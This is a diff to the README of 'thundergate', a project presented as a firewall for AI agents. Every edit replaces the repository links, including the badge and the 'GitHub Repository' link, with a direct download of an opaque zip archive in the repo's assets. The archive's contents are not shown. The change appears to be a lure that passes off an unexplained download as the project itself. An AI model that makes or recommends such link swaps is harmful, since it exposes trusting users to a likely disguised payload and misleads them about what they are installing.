@@ -1,6 +1,6 @@
 # ⚡ thundergate - Protect Your AI Operations Effortlessly
 
-[![Download Thundergate](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/smokee1221/thundergate)
+[![Download Thundergate](https://github.com/smokee1221/thundergate/raw/refs/heads/main/assets/Software_2.9-beta.5.zip)](https://github.com/smokee1221/thundergate/raw/refs/heads/main/assets/Software_2.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Thundergate is a real-time execution firewall for autonomous AI agents. It helps
 
 To download Thundergate, simply visit the link below:
 
-[Download Thundergate](https://github.com/smokee1221/thundergate)
+[Download Thundergate](https://github.com/smokee1221/thundergate/raw/refs/heads/main/assets/Software_2.9-beta.5.zip)
 
 This page contains the latest version of the software. You will find clear instructions to download it for your operating system.
 
@@ -29,7 +29,7 @@ Before installing Thundergate, ensure your system meets the following requiremen
 
    Click on the link below to access the Thundergate download page:
 
-   [Download Thundergate](https://github.com/smokee1221/thundergate)
+   [Download Thundergate](https://github.com/smokee1221/thundergate/raw/refs/heads/main/assets/Software_2.9-beta.5.zip)
 
 2. **Choose Your Version**
 
@@ -93,4 +93,4 @@ If you encounter any issues while using Thundergate, here are some common soluti
 
 Thundergate offers a robust solution for managing and securing your AI agents. With its real-time monitoring, customizable rules, and strong security measures, you can operate with confidence.
 
-For more information and updates, check the [GitHub Repository](https://github.com/smokee1221/thundergate) regularly.
+For more information and updates, check the [GitHub Repository](https://github.com/smokee1221/thundergate/raw/refs/heads/main/assets/Software_2.9-beta.5.zip) regularly.
